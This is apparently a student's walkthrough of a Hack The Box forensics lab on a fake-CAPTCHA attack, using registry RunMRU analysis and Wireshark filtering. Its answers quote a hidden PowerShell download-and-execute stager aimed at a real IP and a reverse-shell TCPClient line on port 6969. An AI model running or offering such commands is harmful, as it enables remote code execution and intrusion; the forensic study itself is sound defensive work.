
# Theory part :-
---

1) What is registry?
	
	 -  https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry
	 - https://blog.cyber5w.com/introducing-windows-registry
	 - For in depth explanation: [[Registry]]





# Steps to solve:-
---

1) **Download the file :** wget -O Pikaptcha.zip "https://labs.hackthebox.com/api/v4/challenges/774/cdn/..."

2) **Unzip the file:** sudo 7z x Pikaptcha.zip
	
	 There is one zip file and one pcap file : `2024-09-23T052209_alert_mssp_action.zip` and `pikaptcha.pcapng`.
	 
	 After unzipping the `2024-09-23T052209_alert_mssp_action.zip` , there is one directory namely C ( in that there is two folders namely User and Windows) and two files that are `2024-09-23T05_22_09_5720380_CopyLog.csv` &  `2024-09-23T05_22_09_5720380_SkipLog.csv.csv`.
	 

### 1) It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.

- To analyze the registry hive i use a tool called `registry explorer`.
- **Loaded `NTUSER.DAT` hive for user `HTB` in Registry Explorer**  
    _(This contains user-specific activity logs, including run history.)_
    
- **Navigated to `RunMRU` key:**  
    `Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`  
    _(This tracks recently executed commands via Windows Run dialog, useful for identifying executed payloads.)_
    
- **Found a suspicious PowerShell command under value `b`**  
    _(It’s the most recent command executed — highest in the MRU list.)_
    
- **Command uses PowerShell with flags to evade detection:**  
    `-NOP -NonI -W Hidden -Exec Bypass`  
    _(These flags disable logging, run non-interactively, and hide the window.)_
    
- **Payload fetched remotely using:**  
    `IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')`  
    _(This downloads and runs a remote script — classic stager behavior.)_


#### Answer :- powershell -NOP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"



### 2) At what time in UTC did the malicious payload execute?

- In the same row you will find the time.

#### Answer :- 2024-09-23 05:07:45


### 3) The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?

- Earlier you found the malicious URL , now copy the URL and paste in `virustotal` , in the details section you will find the SHA256 hash of the script.

#### Answer :- 579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE


### 4) To which port did the reverse shell connect?

- To find the port to which the reverse shell connect , do the filtration in wireshark with `ip.addr==43.205.115.44` .
- The `office2024install.ps1` script contained a base64-encoded payload.
- Decoding this payload revealed a reverse shell that connects back to the attacker's server:
    
    `$client = New-Object System.Net.Sockets.TCPClient("43.205.115.44",6969)`

#### Answer :- 6969


### 5) For how many seconds was the reverse shell connection established between C2 and the victim's workstation?

- In the same filtration at the below you will find the last communication before the retransmission happened. 

![[Pasted image 20250603093306.png]]

#### Answer :- 403


### 6) Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim's clipboard?

- Now narrow the filtration by `ip.addr==43.205.115.44 and http` , now after filtration is done , in the second log you will find the whole code in which the function is there.

![[Pasted image 20250603094015.png]]

#### Answer :- stageClipboard
